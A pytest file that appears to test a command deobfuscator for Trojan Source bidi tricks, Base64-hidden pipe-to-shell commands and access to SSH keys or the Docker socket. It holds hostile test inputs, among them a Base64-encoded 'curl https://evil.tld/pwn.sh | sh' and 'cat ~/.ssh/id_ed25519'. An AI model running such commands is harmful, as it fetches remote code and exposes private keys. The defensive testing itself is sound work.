"""Adversarial security tests for CommandDeobfuscator (src/activesec/sovereign/deobfuscator.py).

Verifies detection of Trojan Source Unicode Bidi attacks, Base64/Hex command obfuscation,
curl-to-shell social engineering traps, and sensitive host path targeting.
"""

from __future__ import annotations

import pytest

from activesec.core.exceptions import SocialEngineeringAlertError
from activesec.sovereign.deobfuscator import CommandDeobfuscator


@pytest.mark.security
def test_sec_trojan_source_unicode_bidi_blocked() -> None:
    """[Vector B.4: Trojan Source CVE-2021-42574] Immediately blocks invisible Unicode Bidi overrides."""
    deobfuscator = CommandDeobfuscator()
    # Embed U+202E (Right-To-Left Override) inside a benign-looking command
    malicious_cmd = "python3 \u202eekaf_run_tests.py"

    with pytest.raises(SocialEngineeringAlertError) as exc_info:
        deobfuscator.inspect_command(malicious_cmd)
    assert exc_info.value.vector_id == "B.4"


@pytest.mark.security
def test_sec_base64_obfuscated_reverse_shell_exposed_and_blocked() -> None:
    """[Vector F.1: Deceptive UI / Base64 Obfuscation] Decodes Base64 payload and triggers CRITICAL alert."""
    deobfuscator = CommandDeobfuscator()
    # "curl https://evil.tld/pwn.sh | sh" encoded in Base64
    obfuscated_cmd = 'echo "Y3VybCBodHRwczovL2V2aWwudGxkL3B3bi5zaCB8IHNo" | base64 -d | sh'

    report = deobfuscator.inspect_command(obfuscated_cmd)
    assert report.risk_level == "CRITICAL"
    assert report.requires_typed_confirmation is True
    assert "curl https://evil.tld/pwn.sh | sh" in report.decoded_payloads
    assert "F.1:Base64Obfuscation" in report.detected_vectors
    assert "F.1:PipeToShell" in report.detected_vectors

    with pytest.raises(SocialEngineeringAlertError):
        deobfuscator.inspect_command(obfuscated_cmd, fail_on_critical=True)


@pytest.mark.security
def test_sec_sensitive_ssh_and_docker_socket_flagged_critical() -> None:
    """[Vector A.4 & E.1: Host Persistence & Escape] Flags access to ~/.ssh and docker.sock as CRITICAL."""
    deobfuscator = CommandDeobfuscator()
    report = deobfuscator.inspect_command("cat ~/.ssh/id_ed25519 && ls -la /var/run/docker.sock")
    assert report.risk_level == "CRITICAL"
    assert "A.4:SensitiveHostTarget" in report.detected_vectors
